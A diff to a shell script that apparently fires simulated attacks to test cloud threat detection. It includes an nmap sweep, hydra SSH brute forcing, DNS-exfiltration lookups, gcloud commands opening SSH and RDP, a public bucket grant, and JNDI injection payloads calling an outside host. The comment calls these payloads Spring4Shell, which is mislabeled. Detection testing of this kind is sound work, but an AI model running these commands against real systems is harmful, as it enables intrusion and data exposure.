@@ -43,14 +43,15 @@ if [[ ! -f $SETUPCOMPLETE ]]; then
  	#shutdown
 else
    echo "Testing Run"
+   curl ifconfig.io 
 sleep 180
-# 1 - AWS simulate internal recon and attempted lateral movement
+# 1 - AWS simulate internal recon and attempted lateral movement #google cannnot detect
 echo "start test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-sudo nmap -sT 35.243.185.19
+sudo nmap -sT 10.1.1.0/24
 echo "stop test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
-# 3 
-echo "start test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+# 3 SSH - Google says 
+echo "start test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N') 
 hydra -f -l user -P /usr/share/wordlists/limitedwordlist.txt 10.1.1.3 -t 4 ssh
 echo "stop test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
@@ -62,7 +63,7 @@ echo "stop test 4" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 #5 Calling large numbers of large domains to simulate tunneling via DNS
 echo "start test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-dig -f /usr/share/wordlists/dns-exfil.txt  > /dev/null &
+sudo dig -f /usr/share/wordlists/dns-exfil.txt  > /dev/null &
 echo "stop test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 6 - AWS PrivilegeEscalation:Runtime/DockerSocketAccessed
@@ -92,26 +93,52 @@ exec "$@"
 echo "stop test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 #15 - 3.xx - Firewall rules modified to open SSH
-echo "start test 15" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-gcloud compute firewall-rules create allowssh \
+echo "start test 15 ssh w" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+gcloud compute firewall-rules create allowssh-$HOSTNAME \
 --allow=tcp:22 \
 --description="Allow incoming traffic on TCP port 22" \
 --direction=INGRESS \
---target-tags=bitbucket
+--target-tags=bitbucket \
+--network=plat-g-w-sccp-us-east1 \
+--project=plat-g-w-sccp
+echo "stop test 15" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+echo "start test 15 ssh wo" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+gcloud compute firewall-rules create allowssh-$HOSTNAME \
+--allow=tcp:22 \
+--description="Allow incoming traffic on TCP port 22" \
+--direction=INGRESS \
+--target-tags=bitbucket \
+--network=plat-g-wo-sccp-us-east1 \
+--project=plat-g-wo-sccp
 echo "stop test 15" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 #16 - 3.xx - Firewall rules modified to open RDP
-gcloud compute firewall-rules create allowrdp \
-echo "start test 16" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+echo "start test 16 rdp w" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+gcloud compute firewall-rules create allowrdp-$HOSTNAME \
 --allow=tcp:3389 \
 --description="Allow incoming traffic on TCP port 3389" \
 --direction=INGRESS \
---target-tags=bitbucket
+--target-tags=bitbucket \
+--network=plat-g-w-sccp-us-east1 \
+--project=plat-g-w-sccp
+echo "stop test 16" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+echo "start test 16 rdp wo" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+gcloud compute firewall-rules create allowrdp-$HOSTNAME \
+--allow=tcp:3389 \
+--description="Allow incoming traffic on TCP port 3389" \
+--direction=INGRESS \
+--target-tags=bitbucket \
+--network=plat-g-wo-sccp-us-east1 \
+--project=plat-g-wo-sccp
 echo "stop test 16" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 #17 - 6.23 - Spring4Shell vulnerability exploit attempts (CVE-2022-22965)
-echo "start test 17" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-curl https://10.1.1.3/?url=https://localhost&username=${jndi:ldap://${hostName}.localhost/test}
+echo "start test 17 - ldap" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+curl -s http://10.1.1.3/?url=https://localhost&username=${jndi:ldap://attack.retep.ca:666/test}
+echo "start test 17 - rmi" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+curl -s http://10.1.1.3/?url=https://localhost&username=${jndi:rmi://attack.retep.ca:666/test}
+echo "start test 17 - DNS" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+curl -s http://10.1.1.3/?url=https://localhost&username=${jndi:dns://attack.retep.ca:666/test}
 echo "stop test 17" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 gcloud storage objects update gs://plat-g-data-store/stuff.txt --add-acl-grant=entity=AllUsers,role=READER
@@ -123,6 +150,13 @@ mv /var/log/gcp.log /var/log/gcp-"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt
 
 sleep 180
 
+#Cleanup time
+gcloud compute firewall-rules delete allowssh-$HOSTNAME -q --project=plat-g-w-sccp
+gcloud compute firewall-rules delete allowrdp-$HOSTNAME -q --project=plat-g-w-sccp
+gcloud compute firewall-rules delete allowssh-$HOSTNAME -q --project=plat-g-wo-sccp
+gcloud compute firewall-rules delete allowrdp-$HOSTNAME -q --project=plat-g-wo-sccp
+
+sleep 180
 shutdown
 
 fi
